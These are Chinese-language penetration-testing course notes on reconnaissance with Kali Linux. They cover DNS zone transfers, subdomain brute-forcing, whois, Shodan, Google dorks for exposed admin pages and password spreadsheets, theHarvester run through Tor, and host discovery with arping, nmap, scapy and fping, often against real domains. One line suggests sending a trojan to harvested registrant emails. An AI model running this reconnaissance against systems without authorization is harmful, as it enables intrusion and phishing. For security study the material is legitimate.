+<p> dig @8.8.8.8 <a target="_blank" rel="noopener" href="http://www.sina.com/">www.sina.com</a> mx<br>dig <a target="_blank" rel="noopener" href="http://www.sina.com/">www.sina.com</a> any<br>反向查询:dig +noall +answer -x 8.8.8.8<br>bind版本信息: dig +noall +answer txt chaos VERSION.BIND @ns3.dnsv4.com<br>DNS追踪: dig +trace example.com<br>    抓包⽐比较递归查询、迭代查询过程的区别</p>
+<h5 id="DNS区域传输："><a href="#DNS区域传输：" class="headerlink" title="DNS区域传输："></a>DNS区域传输：</h5><p>区域传输介绍：某dns服务器增加了一个主机或者增加了一个根域名服务器，需要让其他的dns也知道，即同步。用的方式就是dns区域传输</p>
+<p>一般的dns区域传输指发生在本域的域名服务器之间。</p>
+<p>但是如果配置有问题的话有可能造成任何人都可以和这些域的域名服务器进行区域传输，就会拿到域下所有的主机记录，www，wwww，news，dbs，ip地址等等都能拿到。</p>
+<p>使用下面这两条命令就可以区域传输，如果配置有问题，就会都给你（这两条最常见，）</p>
+<p>dig @ns1.example.com example.com axfr </p>
+<p>（首先要知道一个域名服务器，再指定一个域名，即命令中的第二个example.com，下载这个域的所有记录，区域传输使用的传输方法就是axfr）</p>
+<p>（演示时候的tips：区域传输的时候抓包发现，区域传输使用的是tcp的53端口，不是udp的53端口，udp和tcp的53端口都是dns使用的，udp只是用来做域名查询）</p>
+<p>使用host也可以实现</p>
+<p>host -T -小写L sina.com 8.8.8.8</p>
+<p>（-l就是全区域传输，-T是使用tcp传输方式，后面是先说明域名，再指定域名下的一个ns记录或者ip）（这里与dig是相反的，dig是先声明ns记录，再说明该域名服务器下的一个域名）</p>
+<p>host -h 查host参数，可以查到-T与-L</p>
+<p>介绍一下man命令</p>
+<p>如果不知道一个命令，一般可以加-h查询，不支持的可以加– help，还不会用的话可以使用man，比如man host，打开manu手册，很详细 </p>
+<p>还有一个是info，与man类似</p>
+<h5 id="DNS字典爆破"><a href="#DNS字典爆破" class="headerlink" title="DNS字典爆破"></a>DNS字典爆破</h5><p>如果不让区域传输等等手段，如何再获得全部的域名下主机记录？</p>
+<p>把很多记录的字典对服务器进行爆破，把目标域及子域的主机记录全都爆破出来</p>
+<p>字典可以自制，也可以利用</p>
+<p>fierce -dnsserver 8.8.8.8 -dns sina.com.cn -wordlist a.txt </p>
+<p>（首先指定一个dns服务器，这个可以任意，电信联通的都行，后面跟上一个-dns指定查那个域，最后指定字典）</p>
+<p>（不配置字典也能运行，发现这个命令会先试着区域传输，传输不成再字典）</p>
+<p>（dpkg -L  fierce，把这个软件包生成的文件及目录显示出来，发现了一个txt文件，怀疑就是这个工具内置的字典，more这个txt文件发现确实有常用的字符串，再cat一下这个txt文件，看看有没有www之类的，cat 这个txt文件 | grep www，筛选www记录，发现很多www1、www2、www- 01等等记录，这些都是某些公司服务器有可能会使用的服务器域名）（</p>
+<p>（所以把a.txt换成这个内置的txt就可以进行字典爆破）</p>
+<p>dpkg是Debian的包管理工具</p>
+<p>dnsdict6 -d4 -t 16 -x sina.com</p>
+<p>（虽然叫dnsdict6，但也可以解析ipv4的，-t参数指定线程数，可以并发16个线程，-x使用什么级别的字典，这个命令有好几个字典。）</p>
+<p>（先-h查一下参数，-d是现实ipv6的信息，显示相关的ns mx域信息，-4显示ipv4地址，-d4就是都显示，-t默认是8最大32，-S是执行SRV服务的拆解，SRV是一种比较特殊的记录类型，作为资源标记的专有域名记录，-s使用小字典 -m普通字典 -l大字典 -x更大字典 -u最大字典，也可以-D指定自己的字典）</p>
+<p>（个人来讲在本章的所有字典工具中，dnsdict内置字典很大，运行速度也比较快）</p>
+<p>dnsenum -f dnsbig.txt -dnsserver 8.8.8.8 sina.com -o sina.xml</p>
+<p>（这个可以支持把结果导出城一个xml文件）</p>
+<p>（同样的这里也可以dpkg -L dnsenum，查询其内置的字典路径，如果dpkg查不到[有时可能通过编译安装的]，还可以用 find / -name dnsenum，以dnsenum为名称的路径都查）</p>
+<p>（dnsenum的功能是很全的，会先试试区域传输，查bind版本信息，再做字典爆破） </p>
+<p>（可以在这么多工具中选顺手的一个，再把其他工具的字典整合成一个大字典）</p>
+<p>dnsmap sina.com -w dns.txt</p>
+<p>（域名，也可以指定域名服务器，这里没展示 ）</p>
+<p>dnsrecon -d sina.com –lifetime 10 -t brt -D dnsbig.txt</p>
+<p>（先指定域名、可以指定超时时间，-t指定查询强度，-D指定字典，-brt就是爆破的意思）  </p>
+<p> dnsrecon -t std -d sina.com</p>
+<p>（std标准的破解方式，速度没有brt快 ）</p>
+<h5 id="DNS注册信息"><a href="#DNS注册信息" class="headerlink" title="DNS注册信息"></a>DNS注册信息</h5><p>通过以上的方式就可以收集到所有的主机记录，除了主机记录</p>
+<p>还有域名的注册信息，比如注册sina的时候会留下注册人的电话邮箱地址等等，</p>
+<p> Whois</p>
+<p>（按不同的地区有不同的whois）</p>
+<p>（internic是最早对ip地址进行分配的机构，后来不同地区范围内，出现地区性的分配机构，APNIC是亚太地区的，AFRINIC非洲地区，IANA国际组织的，可以通过下图的网址去官网上查）</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200326165610141.png" alt="image-20200326165610141"></p>
+<p>（whois的命令和去网页里查是一样的）</p>
+<p> （可以看到server name，registrar：注册者，一般是什么什么公司。whois server：whois服务器，update的时间，过期时间，创建时间，还有域名注册一些相关的id，</p>
+<p>往后翻还有注册时候的邮箱、国际电话、注册者地址——北京理想大厦五十八号，邮编地址，联系电话，传真，联系人姓名）</p>
+<p>比如有邮箱了可以发一个木马试试 </p>
+<p>再以whois wooyun.org试一下 </p>
+<p>可以看到乌云的地址电话</p>
+<p>whois也可以接ip </p>
+<p>PPT：</p>
+<p>whois -h whois.apnic.net 192.0.43.10</p>
+<h5 id="搜索引擎"><a href="#搜索引擎" class="headerlink" title="搜索引擎"></a>搜索引擎</h5><h6 id="搜索引擎SHODAN："><a href="#搜索引擎SHODAN：" class="headerlink" title="搜索引擎SHODAN："></a>搜索引擎SHODAN：</h6><p>（只搜索联网的 服务器，可能搜索到很多物联网设备，物联网设备的安全设施不看重，很可能轻易进去）</p>
+<p>（shodan的每一个参数指令都用：分隔）</p>
+<p>（net：ip地址，可以看到物理地址、开放端口等详细信息</p>
+<p>（这里附加说明了virtualbox的常规里有个加密功能，每次起动虚拟机都需要密码了） </p>
+<p>（系统里有硬件加速，如果是win系统，半虚拟化接口选择mype-V，让虚拟机形成半硬件级别的效果，linux系统用kvm）</p>
+<p>回到正题——shodan的账号信息：</p>
+<p>会生成API key，可以变成程序实现自己的搜索，利用他给的API的key</p>
+<p>首页点explore也能看到shodan常用用法的帮助页面</p>
+<p>firefox有对shodan的插件，在tool——addons里面，搜索shodan可以看到插件</p>
+<p>PPT：</p>
+<p> 公司新闻动态 </p>
+<p> 重要雇员信息 </p>
+<p>机密⽂文档 / 网络拓扑  </p>
+<p>用户名密码 </p>
+<p>目标系统软硬件技术架构</p>
+<p>搜索联网的设备 </p>
+<p>• Banner：http、ftp、ssh、telnet </p>
+<p>• <a target="_blank" rel="noopener" href="https://www.shodan.io/">https://www.shodan.io/</a> • <a target="_blank" rel="noopener" href="http://1.179.177.109:81/index.htm">http://1.179.177.109:81/index.htm</a> </p>
+<p>• 常⻅见filter： </p>
+<p> • net （192.168.20.1） </p>
+<p>• city </p>
+<p>• country（CN、US） </p>
+<p>• port（80、21、22、23） </p>
+<p>• os • Hostname（主机或域名）</p>
+<h6 id="搜索引擎google："><a href="#搜索引擎google：" class="headerlink" title="搜索引擎google："></a>搜索引擎google：</h6><p>这里在kali里用了一个goagent代理，应该在配置里讲过翻墙方法，要回去看！！！！！！！</p>
+<p>+支付 -充值 -宝：搜索含有‘支付’但不含有‘充值’，不含有‘宝’关键字的结果</p>
+<p>“支付 充值” ： 按完整的字符串查找</p>
+<p>title就是指html里面的title，所以intitle就是查找title标签里面有XXX的网页，intext就是查找正文，</p>
+<p>北京的电⼦子商务公司——北京 intitle:电⼦子商务 intext:法⼈人 intext:电话 </p>
+<p>site：搜索哪个站点，inurl搜索url</p>
+<p>PPT：</p>
+<p> +充值 -⽀支付 </p>
+<p>北京的电⼦子商务公司——北京 intitle:电⼦子商务 intext:法⼈人 intext:电话 </p>
+<p>阿里网站上的北京公司联系人——北京 site:alibaba.com inurl:contact </p>
+<p>塞班司法案的PDF⽂文档——SOX filetype:pdf （sox是塞班斯法案的简写）</p>
+<p>法国的⽀支付相关⻚页⾯面——payment site:fr</p>
+<p>搜索结果的链接的右边有一个向下的小三角，显示catched，点击它就可以看到存在谷歌服务器上缓存页面，缓存的往往丢失css框架，所以样式一般都有变化</p>
+<p>inurl:”level/15/exec/-/show” ——url还有这些的网页，这里的字符串指思科中的15级的配置页面</p>
+<p>出来的结果大都是思科的交换机web管理页面了</p>
+<p> intitle:”netbotz appliance” “ok” ——标题栏出现的关键字 </p>
+<p>这是在搜某一个特定类型的机架式的网络摄像头，关键字 值得是APC公司的机房的摄像头</p>
+<p>inurl /admin/login.php ——找后台管理的页面</p>
+<p> 也提醒自己的管理页面不要起这样明显的名字</p>
+<p> inurl:qq.txt ——居然搜到了qq密码和上网位置</p>
+<p> filetype:xls “username | password“ ——搜excel文件里面有username和password的</p>
+<p> inurl:ftp “password” filetype:xls site:baidu.com——在url里面出现有ftp关键字的且有password且excel文件且baidu的</p>
+<p> inurl :Service.pwd ——搜frompage的一个漏洞，frompage是微软的一个软件，这么搜能直接得到使用frompage的账户和密码    </p>
+<p> <a target="_blank" rel="noopener" href="http://exploit-db.com/google-dorks">http://exploit-db.com/google-dorks</a></p>
+<p>这个网址用谷歌是一定要知道的，谷歌搜索指令的大全网站</p>
+<h6 id="YANDEX-•-世界第四⼤大搜索引擎——俄罗斯"><a href="#YANDEX-•-世界第四⼤大搜索引擎——俄罗斯" class="headerlink" title="YANDEX • 世界第四⼤大搜索引擎——俄罗斯"></a>YANDEX • 世界第四⼤大搜索引擎——俄罗斯</h6><p>• <a target="_blank" rel="noopener" href="https://www.yandex.com/">https://www.yandex.com/</a></p>
+<p>下面这个没提</p>
+<p>RECON-NG • 全特性的web侦察框架 • 基于Python开发</p>
+<p>kali可以大量快速并发的搜索，比一个一个搜快</p>
+<p>介绍两个比较重要的命令行搜索工具</p>
+<h6 id="theharvester工具、"><a href="#theharvester工具、" class="headerlink" title="theharvester工具、"></a>theharvester工具、</h6><p>先-h参数查看一下</p>
+<p>最重要的-d，后接域名，帮你搜索这个域在互联网的邮件地址二级域及主机记录</p>
+<p>-b 设定通过谷歌还是bing或者bing的api等等来搜索</p>
+<p>-L 限制搜索结果的数量</p>
+<p>ps：介绍一个终端分屏工具 tmux，命令行直接输tmux    </p>
+<p>theharvester是不支持代理的，那么需要通过代理调用theharvest，</p>
+<p>用proxychains工具：</p>
+<p>先vi /etc/proxychains。conf  查看一下配置文件，</p>
+<p>因为又用了tor浏览器（为了避免谷歌屏蔽连续查询），还需要查看tor浏览器的端口是否开启</p>
+<p>在其他窗口 netstat -pantu |grep 9150 查看9150端口是不是侦听状态</p>
+<p>就可以开始了</p>
+<p>proxychains theharvester -d microsoft.com -l 300 -b google </p>
+<p>查看这个域名的邮箱地址和主机记录 </p>
+<p>• 邮件 • theharvester -d sina.com -l 300 -b google </p>
+<p>metagoofile 搜-d指定的域名 -t指定文件类型  -n先知下载的文件数量 -l限制搜索数量 -o工作目录 -f输出为什么文件</p>
+<p>• 文件 • metagoofile -d microsoft.com -t pdf -l 200 -o test -f 1.html</p>
+<p>先mkdir一个目录作为工作目录，在这个目录里运行metagoofile</p>
+<p>就可以下载到pdf了</p>
+<h6 id="MELTAGO"><a href="#MELTAGO" class="headerlink" title="MELTAGO"></a>MELTAGO</h6><p>meltago是kali里面top10的工具，所以在顶部菜单栏里能直接找到他</p>
+<p>maltego特别对kali定制了一版</p>
+<p>maltego是为数不多的一个开源里很优秀的综合信息收集软件</p>
+<p>打开有搜索向导，有通过url或者通过twitter或者个人email地址或者指纹信息等等类型进行搜索</p>
+<p>但也可以自定义，（关掉向导）</p>
+<p>首次登陆需要注册账号</p>
+<p>左边类型的信息给他一个它能拓展找出很多</p>
+<p>最典型：只知道一个域名</p>
+<p>dns改成sina。com</p>
+<p>每一个拓展信息称之为transform</p>
+<p>对sina.com run transform——》convert to domain——》DNS</p>
+<p>通过域名查dns信息</p>
+<p>继续查dns name（mx记录）</p>
+<p>下面有运行日志</p>
+<p>同样的也可以查ns记录等等</p>
+<p>也可以区域传输</p>
+<h3 id="kali安全第七章——主动信息收集"><a href="#kali安全第七章——主动信息收集" class="headerlink" title="kali安全第七章——主动信息收集"></a>kali安全第七章——主动信息收集</h3><p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200427225012607.png" alt="image-20200427225012607"></p>
+<p>一般先从ip层面扫描，再从端口，再从服务层面，一层层扫描</p>
+<p>发现：</p>
+<p>识别活着的主机</p>
+<p>​    潜在的被攻击目标</p>
+<p>输出一个ip地址列表</p>
+<p>2、3、4层发现</p>
+<p>这里的234层就是OSI的分层</p>
+<h6 id="发现——二层发现"><a href="#发现——二层发现" class="headerlink" title="发现——二层发现"></a>发现——二层发现</h6><p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200427225746962.png" alt="image-20200427225746962"></p>
+<p>二层 数据链路层，主要使用的都是arp协议</p>
+<p>这个层面的优点是速度快，结果可靠</p>
+<p>缺点是不可路由，只能发现本网段之内的</p>
+<p>二层发现的工具软件使用方法</p>
+<p>arping</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200427230204180.png" alt="image-20200427230204180"></p>
+<p>如果不加-c，就会一直发arping的包</p>
+<p>实际上一个包就能知道ip是不是活着的</p>
+<p>没返回就是死的ip</p>
+<p>这里wireshark抓一下arp的包，能看到mac地址</p>
+<p>-d参数是？（arp -h如果没反应就man arp）</p>
+<p>发现重复的响应，如果应答从两个不同的mac地址却是一个ip发出的话，</p>
+<p>如果两个mac用的同一个ip，这个ip又是一个网关的ip，是什么情况？ </p>
+<p>那就是被arp地址欺骗了 </p>
+<p>ppt上第四条 使用管道</p>
+<p>bytes from是如果ip是活着的，就会返回这样的信息，这样就能筛选出所有活着的ip</p>
+<p>但也发现arp只能ping一个地址，不能ping网段</p>
+<p>所以用脚本实现</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200427233546746.png" alt="image-20200427233546746"></p>
+<p>过程中可以wireshark抓包看一下</p>
+<p>如果通过这步扫描过后一段时间，想再查看一下是不是还都活着，可以用第二个脚本</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200427234735532.png" alt="image-20200427234735532"></p>
+<p><strong>Nmap</strong></p>
+<p>简单介绍一下nmap在二层发现的使用，nmap很强大</p>
+<p>以后会单独再系统介绍nmap</p>
+<p>直接输nmap会显示帮助信息</p>
+<p>nmap直接接ip地址，会对ip地址进行一系列端口扫描</p>
+<p>二层扫描的时候就要对端口扫描屏蔽， </p>
+<p>-sn 只做平扫描不做端口扫描</p>
+<p>二层发现只是用sn就可以了</p>
+<p>nmap -sn 1.1.1.1-254 （也可以写成 1.1.1.0/24）</p>
+<p>nmap -iL iplist.txt -sn</p>
+<p>通过-iL调用之前的ip列表文件，查看是不是还活着 </p>
+<p>但其实nmap不是严格意义上的arp发现，这两个命令同事发的不只是arp包，还有很多dns包等等</p>
+<p><strong>第二个二层发现的工具——Netdiscover</strong></p>
+<p>可以实现主动的发现也可以实现被动的发现，有线无线都能用</p>
+<p>专用于二层</p>
+<p>主动</p>
+<p>也是主动发arp包，得到回应就知道是活着的，也可以对ip列表检查</p>
+<p>也可以用被动的扫描 ，就是侦听，</p>
+<p>实际是把网卡设置成混杂模式，收取非本王卡的数据包，arp又是基于网络的，所以网络里有主机发了arp包就能侦听到</p>
+<p>这样会不是那么实时，但其实还好，基本和主动的效果差不了太多</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200429213618798.png" alt="image-20200429213618798"></p>
+<p>-i 指定网卡 -r 指定网段</p>
+<p>-p passive被动式</p>
+<p><strong>二层发现——Scapy</strong></p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200429214153021.png" alt="image-20200429214153021"></p>
+<p>既是一个库文件，也可以作为单独工具</p>
+<p>为python做网络数据包操作的库</p>
+<p>所以可以抓包分析，也可以创建数据包，也可以修改数据包后重放</p>
+<p>命令行输入scapy 会进入python环境</p>
+<p>如果这时报警告 gnuplot，就是可能没有安装gnuplot组建，相关功能可能无法使用</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200429214730775.png" alt="image-20200429214730775"></p>
+<p>安装参照ppt命令</p>
+<p>二层扫描一定要用arp</p>
+<p> ARP() 就是调用库里arp函数，但这样调用不会显示任何结果</p>
+<p>（arp必须大写）</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200429215135927.png" alt="image-20200429215135927"></p>
+<p>显示arp函数的默认参数，arp函数就是创建一个arp包，库已经设定好了一些常见的参数</p>
+<p> 1、硬件类型</p>
+<p>2、协议类型</p>
+<p>3、硬件地址长度</p>
+<p>4、协议地址长度（arp解析ip的，所以就是长度4）</p>
+<p>5、操作（who-has就是查询）</p>
+<p>6、源mac地址</p>
+<p>7、我要查的ip地址</p>
+<p>8、可能知道我要查的ip地址的mac地址的人</p>
+<p>一般都会定义变量来调用它，讲解之前先看一下arp包头</p>
+<p>找一个request的arp包</p>
+<p> <img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200429215505522.png" alt="image-20200429215505522"></p>
+<p>1、硬件类型：以太网一</p>
+<p>2、上层协议：ip</p>
+<p>3、硬件地址大小</p>
+<p>4、协议地址长度</p>
+<p>5、操作码：request</p>
+<p>6、源mac </p>
+<p>7、目标mac：（request还没查到呢，所以为空）</p>
+<p>8、要查谁的</p>
+<p>可见包头跟库里定义的结构是一样的</p>
+<p>所以要查什么，就把要查的填进去，就完成了arp查询</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200429220018877.png" alt="image-20200429220018877"></p>
+<p>定义一个变量调用arp函数。arp变量使用ARP函数定义出来的，也就继承了所有ARP函数里的属性，所以也能display</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200429220120576.png" alt="image-20200429220120576"></p>
+<p>就可以像属性一样直接赋值</p>
+<p> 发包用sr1()，发完有回应会显示</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200429220340583.png" alt="image-20200429220340583"></p>
+<p>每个数据包的最后一部分都会有padding，就是不满足最小的包的大小，所有arp的字段还达不到以太网包的大小要求，就会补上0000</p>
+<p>也可以这样，回包更规整</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200429222838752.png" alt="image-20200429222838752"></p>
+<p>当然也可以不定义变量，直接ARP（）括号里直接输参数，得到返回结果</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200430091355007.png" alt="image-20200430091355007"></p>
+<p>如果查询的是一个不存在的ip，scapy会一直查询直到这个ip出现，</p>
+<p>但这样的话，有一个ip不存在，scapy就会一直等着，后面的ip就一直得不到查询</p>
+<p>所以通常来说再只能够后面加timeout，verbose是是否显示报错信息</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200430091627195.png" alt="image-20200430091627195"></p>
+<p>也可以python脚本实现</p>
+<p>arp1.py</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200429223607317.png" alt="image-20200429223607317"></p>
+<p>logging是日志，subprocess系统指令的调用模块（比如ping）</p>
+<p>下面一行是日志等级的设置</p>
+<p>在下面就是from scapy</p>
+<p>执行</p>
+<p>先赋权（刚刚的shell脚本其实也要，当时没说）</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200430091809082.png" alt="image-20200430091809082"></p>
+<p>不赋予权限也可以，用python执行它</p>
+<p>python + 脚本.py</p>
+<p>这里提权以后，类似shell的直接./脚本就可以</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200430092025221.png" alt="image-20200430092025221"></p>
+<p>速度快比较 nmap&gt;shell&gt;py（因为py的timeout时间长，好的脚本可以更快）</p>
+<p>scapy每个ip地址都发两个数据包（处于结果准确性考虑）（wireshark看出）</p>
+<p>（但可以程序限定上设定为一个数据包）</p>
+<p>第二个脚本arp2.py（调用之前的ip列表文件）</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200430092430839.png" alt="image-20200430092430839"></p>
+<p><strong>什么时候会用到二层发现</strong></p>
+<p>二层发现通常已经控制一台机器，要对内网进行渗透的时候，先用二层发现发现内网有哪些机器</p>
+<p>一般控制的机器没有nmap，试arping，还没有就一个一个试，这就是学习多工具的用处</p>
+<h6 id="发现——三层发现"><a href="#发现——三层发现" class="headerlink" title="发现——三层发现"></a>发现——三层发现</h6><p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200430142346112.png" alt="image-20200430142346112"></p>
+<p>三层是基于tcpip，ip层</p>
+<p>一般把ip，icmp都划为第三层</p>
+<p>internet控制管理协议，主要作用是路径发现以及主机网络通断的检测控制协议，和后面讲的snmp简单网络管理协议是不一样的</p>
+<p>三层发现使用的协议主要都是icmp</p>
+<p>于二层比较，三层最好的好处是可路由</p>
+<p>理论上icmp能发现世界上所有活着的主机，前提是主机都回应我的icmp包</p>
+<p>扫描可能被边界防火墙过滤，比二层满但也挺快的</p>
+<p>对扫描的结果不要百分之百信任，有时的安全措施甚至能收到对宕机的icmp包，也会发迷惑的响应icmp包</p>
+<p>包括二层也可能存在误报漏报</p>
+<p><strong>ping</strong></p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200430143628155.png" alt="image-20200430143628155"></p>
+<p>注意linux的ping命令和windows的ping命令有很大不同，但用途一样</p>
+<p>这就是同样一个协议，不同厂商在实现时的不同策略的体现</p>
+<p>比如windows的ping只凭四次就结束，linux会一直进行</p>
+<p>要停止就-c 加ping次数</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200430144101225.png" alt="image-20200430144101225"></p>
+<p>192.168.1.1时网关，主机192.168.1.132</p>
+<p>第一个字段就是类型——8（icmp发）</p>
+<p>响应类型0（icmp收）</p>
+<p>数据字段：</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200430144228456.png" alt="image-20200430144228456"></p>
+<p>linux的ping包数据就是乱码加12345</p>
+<p>windows的ping包数据字段就不是这样</p>
+<p><strong>使用到icmp特别典型的场景</strong></p>
+<p>如果想知道是不是活着的，就可以ping它看给不给类型0的包</p>
+<p>还有一种方式就是路由追踪的方式，不但有可能发现目标机器，还能发现经过多少跳路由</p>
+<p>traceroute <a target="_blank" rel="noopener" href="http://www.sina.com/">www.sina.com</a></p>
+<p>traceroute 发的都是icmp包 </p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200430144527172.png" alt="image-20200430144527172"></p>
+<p>1-18表示经过了多少跳的路由器</p>
+<p>1、到无线路由器</p>
+<p>2、当地运营商ip</p>
+<p>3、逐级逐级</p>
+<p>8-17跳没有收到任何返回信息，这就是边界或者路由设备屏蔽icmp信息，</p>
+<p>最后一条回应了，</p>
+<p>wireshark抓包</p>
+<p>之前将ip包头时讲过一个ttl值</p>
+<p>不同操作系统ttl值不同，大部分linux的ttl值为64，</p>
+<p>trace有不同的地方，先设置ttl值为1， 然后每过一个路由器都会减一，所以第一个路由器直接返回了</p>
+<p>再ttl变为2，到第二个路由器返回，就这样实现每一条路由器的追踪 </p>
+<p>实际上使用ping -R 也能实现路由的追踪</p>
+<p>-R从我的电脑到目标的每一跳的ip地址</p>
+<p>这里的trace和windows的tracer作用类似，但ping -R不一样</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200430151823831.png" alt="image-20200430151823831"></p>
+<p>发traceroute时， ttl为1，返回第一个⚪的左边的ip，ttl为2，返回第二个⚪左边的ip，即都发里我比较近的网口的ip地址</p>
+<p>如果发ping -R，返回的就是离我比较远的ip地址</p>
+<p>因此同时运用traceroute与ping -R，可以每一条的内 外 网口ip都知道</p>
+<p>同样的ping命令不支持网段的检测，尽管这样的管道可以知道如果活着的就返回活着的ip</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200430154509351.png" alt="image-20200430154509351"></p>
+<p>但为了能检测网段，就可以使用shell脚本</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200430160011026.png" alt="image-20200430160011026"></p>
+<p>（如何找到本机的网络字段</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200430155906962.png" alt="image-20200430155906962"></p>
+<p> ）</p>
+<p>执行pinger.sh</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200430160213257.png" alt="image-20200430160213257"></p>
+<p><strong>Scapy</strong></p>
+<p>先来定义一个ip包头，再来定义一个icmp包头，再把他俩组合起来，形成一个ping包出去</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200430160449022.png" alt="image-20200430160449022"></p>
+<p>查看一下ping</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200430160516448.png" alt="image-20200430160516448"></p>
+<p>icmp的type正好就是request，也就是8</p>
+<p>要ping的目标，填在ip包头里的dst</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200430164940747.png" alt="image-20200430164940747"></p>
+<p>这里src也变了，时命令会自动侦测本机网卡</p>
+<p>同时使用了icmp，所以ip包头中的proto即上层协议类型，也变为了icmp</p>
+<p>发出去，如果活着，就会响应一个包</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200430165200915.png" alt="image-20200430165200915"></p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200430165211994.png" alt="image-20200430165211994"></p>
+<p>回的ttl值时64，因为192.168.1.1在一个网段里，没减一</p>
+<p>icmp的type是0，reply</p>
+<p>后面是padding，补位的字节</p>
+<p>当然也可以一行命令</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200430165358104.png" alt="image-20200430165358104"></p>
+<p>icmp不需要配置，默认发的就是request，如果不是，就在括号里加type=8</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200430165459059.png" alt="image-20200430165459059"></p>
+<p>同样的，不存在的ip命令会一直等下去，所以多个ip要加timeout，单位毫秒</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200430165602098.png" alt="image-20200430165602098"></p>
+<p><strong>脚本</strong></p>
+<p>pinger1.py</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200430165648017.png" alt="image-20200430165648017"></p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200430165727800.png" alt="image-20200430165727800"></p>
+<p>与刚刚shell结果一样，但shell是并行的，py不是，所以比shell慢</p>
+<p>pinger2.py</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200430170027598.png" alt="image-20200430170027598"></p>
+<p>取地址就是取文件名啦</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200430171227833.png" alt="image-20200430171227833"></p>
+<p><strong>nmap</strong></p>
+<p>二层发现时用的-sn</p>
+<p>三层发现也是-sn</p>
+<p>nmap如果发现是同网段的发arp包，不同网段的，挥发icmp的包</p>
+<p>同样nmap也会发DNS包（与二层发现一样）</p>
+<p>不同的是，还发了两个TCP的包</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200430171618310.png" alt="image-20200430171618310"></p>
+<p>实际上，nmap命令里没有单独的只用icmp的参数，通常都很综合的技术进行探测，这里用的第三层，实际上也用到了第四层，第四层时tcp协议</p>
+<p><strong>fping</strong></p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200430171848998.png" alt="image-20200430171848998"></p>
+<p>命令格式都类似，但更详细，有时间，是否丢失</p>
+<p>fping可以扫描网段，-g设定起始ip和结束ip，</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200501082803367.png" alt="image-20200501082803367"></p>
+<p>输出的结果有一点混乱，因为有loss=100%的就是没活着的，可以用管道剔除掉没活着的，只留下loss=0%的</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200501085425255.png" alt="image-20200501085425255"></p>
+<p>输出为txt</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200501090017026.png" alt="image-20200501090017026"></p>
+<p>扫描网段的其他方式和扫描列表</p>
+<p><img src="C:\Users\Nouz\AppData\Roaming\Typora\typora-user-images\image-20200501090306510.png" alt="image-20200501090306510"></p>
+<p><strong>Hping</strong></p>
+<p>能够发送几乎任意tcp/ip包，tcp/ip包头中的几乎每一个字段，Hping都有对应的参数可以更改</p>
+<p>支持三层发现，也支持基于</p>
+<p>tcp发压力测试，大量的tcp包，在拒绝服务攻击还会介绍</p>
+<p>但只能对单一地址做扫描</p>
